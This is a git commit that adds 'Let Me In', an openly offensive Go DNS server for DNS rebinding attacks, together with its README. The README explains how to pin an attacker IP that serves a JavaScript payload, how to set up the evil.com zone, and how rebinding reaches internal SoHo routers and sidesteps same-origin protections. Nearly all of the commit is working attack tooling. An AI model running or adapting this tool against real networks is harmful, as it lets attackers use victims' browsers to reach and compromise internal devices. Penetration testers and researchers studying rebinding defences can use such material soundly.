db6750ccc5482c9479f5d015b074349e9ef0fe8f
MaMe82 <mame8282@googlemail.com>
2018-06-22 20:15:32 +0200

    Initial commit of DNS server supporting DNS rebind attacks

---
+++ README.md
@@ -0,0 +1,74 @@
+# "Let Me In" rebind DNS server by MaMe82
+
+## Usage:   
+`lmidns -domain my-rebind-domain.com`
+
+## Query example (nslookup as resolver):
+### 1) Creating a DNS request, which resolves to an arbitrary IPv4 address:                    *
+`nslookup 192-168-2-1.my-rebind-domain.com`
+
+The host part of the request will be parsed by the DNS server and handed back as IP in the response
+
+`Response:  192.168.2.1`
+
+### 2) Temporary pin another IP
+
+A request for `192-168-2-1.my-rebind-domain.com` will be resolved to `192.168.2.1`. In order to allow DNS rebinding, this request has to temporarily be resolved to another arbitrary IP (the one, where custom "evil content" is hosted).  
+In order to pin another IP, let's say `3.2.4.5` for a given amount of seconds, the following name scheme is used:
+`<legacy-ip>-to-<temporary-ip>-for-<time-to-pin-in-seconds>`.
+
+#### Example:
+
+Pin the IP 3.2.4.5 to lookups aiming for IP 192.168.2.1 for 10 seconds
+
+* Request 1: `nslookup 192-168-2-1-to-3-2-4-5-for-10.my-rebind-domain.com`
+* Response 1: `3.2.4.5` (this response doesn't help, as the domain conflicts with SOP)
+
+Issue a lookup which should return 192.168.2.1 (if no other IP is pinned)
+
+* Request 2: `nslookup 192-168-2-1.my-rebind-domain.com`
+* Response 2: `3.2.4.5` (lookups resolve to 3.2.4.5 for 10 seconds) forwarder themselves.
+
+
+
+... wait 10 seconds and repeat the lookup ...
+
+* Request 3:  `nslookup 192-168-2-1.my-rebind-domain.com`
+* Response 3: `192.168.2.1` (the lookup resolves to the intended IP again)
+
+So we could resolve the same hostname to two different IP addresses, which allows to bypass SOP in DNS rebinding based attacks.
+
+Usually the first IP delivers a JS payload, which tries to constantly access the same hostname via JS (respecting the SOP). As soon as the hostname resolves to the former arbitrary IP (after timeout), the JS ends up accessing a potential target (still with respect to the SOP). 
+
+## Install
+`go get github.com/mame82/LetMeIn`
+
+`lmidns -domain your.rebind.domain`
+
+## DNS setup example
+
+In order to use this as public DNS, you need to setup a `NS` record and, for example, an `A` record which the `NS` record could point to.
+
+**Example for zone 'evil.com' with `lmidns` running on 2.4.3.5:**
+
+Below is an example for the needed resource records on a zone (owned by you) with the name `evil.com`.
+The "Let Me In" rebind DNS server should use the subdomain `lmins.evil.com`
+
+```
+lmins.evil.com.		0       IN	A	2.4.3.5
+lmi.evil.com.		3600	IN	NS	lmins.evil.com.         
+```
+
+With this zone configuration the NS for lmins.evil.com is on 2.4.3.5 and we can run lmidns on this server with:
+
+`lmidns -domain lmins.evil.com`  
+
+## Additional notes
+
+As most of the DNS rebind attacks are targeting with SoHo networks, keep in mind that some routers block DNS replies belonging to their own subnets, in case they're providing a DNS semselves.
+
+F.e. AVM FRITZ!Box provides a subnet like `192.168.7.0/24` for LAN clients and the gateway provides an DNS forwarder on `192.168.178.1:53`. Now if one of the clients of this subnet tries to resolve `192-168-178-1.lmi.evil.com`, the response (which would be `192.168.172.1`) will blocked by the FRITZ!Box DNS forwarder (which is a nice DNS rebinding mitigation btw.). This could only be bypassed, in case the client uses a hardcoded external nameserver (ignoring the one offered by DHCP server).
+
+So please, avoid opening issues for things like that.
+
+
---
+++ lmidns.go
@@ -0,0 +1,205 @@
+//    This file is part of LeMeIn.
+//
+//    Copyright (c) 2018, Marcus Mengs.
+//
+//    P4wnP1 is free software: you can redistribute it and/or modify
+//    it under the terms of the GNU General Public License as published by
+//    the Free Software Foundation, either version 3 of the License, or
+//    (at your option) any later version.
+//
+//    P4wnP1 is distributed in the hope that it will be useful,
+//    but WITHOUT ANY WARRANTY; without even the implied warranty of
+//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+//    GNU General Public License for more details.
+//
+//    You should have received a copy of the GNU General Public License
+//    along with P4wnP1.  If not, see <http://www.gnu.org/licenses/>.
+
+package main
+
+import (
+	"fmt"
+	"github.com/miekg/dns"
+	"net"
+	"regexp"
+	"strings"
+	"sync"
+	"time"
+	"log"
+	"flag"
+	"os"
+	"strconv"
+	"os/signal"
+	"syscall"
+)
+
+var (
+	pm = newPinMap()
+
+	//flags
+	domain = flag.String("domain",".","the domain to serve A records for")
+	port = flag.Int("port", 53, "port to run on")
+
+
+	reIP = regexp.MustCompile("(?m)(^[0-9]{1,3}-[0-9]{1,3}-[0-9]{1,3}-[0-9]{1,3})\\..*")
+	//Note: case insensitive matching (nice observation: `ping` switches case on every attempt to resolve)
+	reIPpin = regexp.MustCompile("(?mi)(^[0-9]{1,3}-[0-9]{1,3}-[0-9]{1,3}-[0-9]{1,3})-to-([0-9]{1,3}-[0-9]{1,3}-[0-9]{1,3}-[0-9]{1,3})-for-([0-9]{1,2})\\..*")
+)
+
+type pinMap struct {
+	sync.Mutex
+	m map[string]string
+}
+
+func newPinMap() (pm pinMap) {
+	pm = pinMap{
+		m: make(map[string]string),
+	}
+	return
+}
+
+// Note: if this function is called multiple times, the "delete after timeout" of
+// the first call will trigger, anyway.
+func (pm *pinMap) PinMapAdd(requestIP, responseIP string, timeout time.Duration) {
+	go func() {
+		pm.Lock()
+		pm.m[requestIP] = responseIP
+		pm.Unlock()
+
+		time.Sleep(timeout)
+
+		pm.Lock()
+		log.Printf("Deleted temporary mapping from %s to %s\n", requestIP, responseIP)
+		delete(pm.m, requestIP)
+		pm.Unlock()
+	}()
+}
+
+func (pm *pinMap) PinMapGet(requestIP string) (val string, exists bool) {
+	pm.Lock()
+	val,exists = pm.m[requestIP]
+	pm.Unlock()
+	return
+}
+
+func dnsHandleFunc(w dns.ResponseWriter, r *dns.Msg) {
+	//fmt.Printf("Request: %+v\n",r)
+	m := new(dns.Msg)
+	m.SetReply(r)
+	m.Authoritative = true
+
+
+	qt := r.Question[0].Qtype
+	qn := r.Question[0].Name
+	//fmt.Printf("QType: %d; Name: %s\n", qt, qn)
+
+	switch qt {
+	case dns.TypeA:
+		resolveIP := "127.0.0.1"
+		if sm := reIP.FindStringSubmatch(qn); len(sm) > 1 {
+			//extract ip from dns name
+			resolveIP = strings.Replace(sm[1], "-", ".", -1)
+
+			//check if there's a stored response
+			if rspIP, exists := pm.PinMapGet(resolveIP); exists {
+				resolveIP = rspIP
+			}
+		}
+		if sm := reIPpin.FindStringSubmatch(qn); len(sm) == 4 {
+			reqIPName := sm[1]
+			reqIP := strings.Replace(reqIPName,"-",".", -1)
+			rspIPName := sm[2]
+			rspIP := strings.Replace(rspIPName, "-", ".", -1)
+			timeout,err := time.ParseDuration(sm[3] + "s")
+			if err != nil { timeout = 5*time.Second } //failover to 5 seconds pinning
+			log.Printf("Lookups (type A) for %s.%s will be answered with %s for %v and with %s afterwards\n", reqIPName, domain, rspIP, timeout, reqIP)
+			//Answer with pinned IP
+			resolveIP = rspIP
+			//add to pinmap
+			pm.PinMapAdd(reqIP,rspIP,timeout)
+		}
+		log.Printf("RESOLVING '%s' to IP %v\n", qn, resolveIP)
+
+		//create resource record
+		rr := &dns.A{
+			Hdr: dns.RR_Header{
+				Name: qn,
+				Rrtype: dns.TypeA,
+				Class: dns.ClassINET,
+				Ttl: 0,
+			},
+			A: net.ParseIP(resolveIP),
+		}
+		m.Answer = append(m.Answer, rr)
+	}
+	w.WriteMsg(m)
+
+}
+
+
+
+
+func main() {
+	flag.Parse()
+	infoText := `******************************************************************************
+*              "Let Me In" rebind DNS server by MaMe82                       *
+******************************************************************************
+* Usage:   lmidns -domain my-rebind-domain.com                               *
+*                                                                            *
+* From DNS client (example with nslookup):                                   *
+* 1) Create request, resolving to arbitrary IPv4 address:                    *
+*    Request:   nslookup 192-168-2-1.my-rebind-domain.com                    *
+*    Response:  192.168.2.1                                                  *
+*                                                                            *
+* 2) Temporary pin IP 3.2.4.5 to the same hostname for 10 seconds:           *
+*    Request 1:  nslookup 192-168-2-1-to-3-2-4-5-for-10.my-rebind-domain.com *
+*    Response 1: 3.2.4.5 (could be ignored)                                  *
+*                                                                            *
+*    Request 2:  nslookup 192-168-2-1.my-rebind-domain.com                   *
+*    Response 2: 3.2.4.5 (answers with pinned IP for 10 seconds)             *
+*        ... wait 10 seconds ...                                             *
+*    Request 3:  nslookup 192-168-2-1.my-rebind-domain.com                   *
+*    Response 3: 192.168.2.1 (answers with IP based on resolved name, again) *
+******************************************************************************`
+
+	flag.Usage = func() { fmt.Fprintln(os.Stderr, infoText) }
+	flag.Usage()
+
+	fmt.Printf("Serving domain: '%s'\n", *domain)
+
+	//domain = "lmi.mame82.de"
+	dns.HandleFunc(*domain, dnsHandleFunc)
+
+	go func() {
+		Net := "udp"
+		Addr := ":" + strconv.Itoa(*port)
+		server := &dns.Server{
+			Net: Net,
+			Addr: Addr,
+		}
+		fmt.Printf("Listening on address: '%s'(%s)\n", Addr, Net)
+		if err := server.ListenAndServe(); err != nil {
+			log.Fatalf("Failed to setup the '%s' server on '%s': %v\n", Net, Addr, err.Error())
+		}
+	}()
+
+	go func() {
+		Net := "tcp"
+		Addr := ":" + strconv.Itoa(*port)
+		server := &dns.Server{
+			Net: "tcp",
+			Addr: Addr,
+		}
+		fmt.Printf("Listening on address: '%s'(%s)\n", Addr, Net)
+		if err := server.ListenAndServe(); err != nil {
+			log.Fatalf("Failed to setup the '%s' server on '%s': %v\n", Net, Addr, err.Error())
+		}
+	}()
+
+	//use a channel to wait for SIGTERM or SIGINT
+	sig := make(chan os.Signal)
+	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
+	s := <-sig
+	log.Fatalf("Signal (%v) received, closing \"Let Me In\" rebind DNS server\n", s)
+
+}
